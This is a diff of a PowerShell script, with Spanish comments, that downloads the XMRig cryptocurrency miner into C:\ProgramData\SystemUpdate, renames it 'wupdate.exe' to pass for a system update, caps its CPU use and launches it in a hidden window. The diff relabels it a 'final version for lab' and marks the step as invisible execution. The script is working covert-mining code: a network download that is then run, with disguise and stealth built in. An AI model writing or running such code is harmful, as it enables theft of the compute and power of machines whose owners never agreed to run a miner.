@@ -1,8 +1,8 @@
-# === DEPLOY XMRig MINERO - Versión 6 (Config 100% limpia sin BOM) ===
+# === DEPLOY XMRig MINERO - Versión FINAL para lab ===
 $installPath = "C:\ProgramData\SystemUpdate"
 New-Item -ItemType Directory -Path $installPath -Force | Out-Null
 
-# Descarga y extrae
+# Descarga y extrae XMRig
 $zipUrl = "https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-windows-x64.zip"
 $zipPath = "$installPath\xmrig.zip"
 Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath -UseBasicParsing
@@ -12,7 +12,7 @@ Remove-Item $zipPath -Force
 # Copiar ejecutable
 Copy-Item "$installPath\xmrig-6.25.0\xmrig.exe" "$installPath\wupdate.exe" -Force
 
-# Configuración limpia (usamos ConvertTo-Json + UTF8 sin BOM)
+# Configuración limpia (sin BOM)
 $config = @{
     autosave = $true
     cpu = @{ "max-threads-hint" = 50 }
@@ -32,8 +32,8 @@ $config = @{
 $configPath = "$installPath\config.json"
 $config | ConvertTo-Json -Depth 10 | Set-Content -Path $configPath -Encoding UTF8NoBOM -Force
 
-# Ejecutar el minero directamente (sin ventana)
+# === EJECUCIÓN INVISIBLE ===
 $exePath = "$installPath\wupdate.exe"
-Start-Process -FilePath $exePath -ArgumentList "-c `"$configPath`"" -WindowStyle Hidden -NoNewWindow
+Start-Process -FilePath $exePath -ArgumentList "-c `"$configPath`"" -WindowStyle Hidden
 
-Write-Output "=== Minero lanzado (versión 6 - config limpia) ==="
+Write-Output "=== Minero desplegado correctamente (versión final) ==="
